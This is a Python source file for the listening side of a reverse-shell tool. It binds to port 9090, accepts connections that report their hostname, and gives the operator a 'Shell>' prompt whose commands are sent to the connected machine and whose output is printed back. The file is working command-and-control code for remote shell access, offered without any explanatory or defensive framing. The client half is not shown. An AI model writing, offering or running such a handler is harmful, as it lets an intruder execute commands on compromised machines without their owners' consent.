import socket 
import sys
import time

class Server(object):

    def __init__(self):
        self.host = ''
        self.port = 9090
        self.socket = None
        
    def create_server(self):
        try:
            self.socket = socket.socket()
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            return True
        except socket.error as e:
            print("[-] socket creation failed " + str(e))
            time.sleep(5)
            self.create_server()

    def start_server(self):
        while 1:
            try:
                print("[+] Server: waiting for new connection")
                conn, address = self.socket.accept()
                client_hostname = conn.recv(1024).decode('utf-8')
                print('[+] {} {} connected'.format(client_hostname, address))
                self.send_commands(conn)
            except socket.error as e:
                print("[-] Error accepting a new connection " + str(e))
    
    def send_commands(self, client):
        while True:
            cmd = input("Shell> ")
            if not cmd:
                continue
            client.send(cmd.encode())
            if cmd == 'quit':
                break
            
            response = ''
            while '<END>' not in response:
                response += str(client.recv(4096), "utf-8")

            response = response.replace('<END>', '') 
            print(response + "\n", end="")

if __name__ == '__main__':
    print('[+] Starting...')
    server = Server()
    server.create_server()
    server.start_server()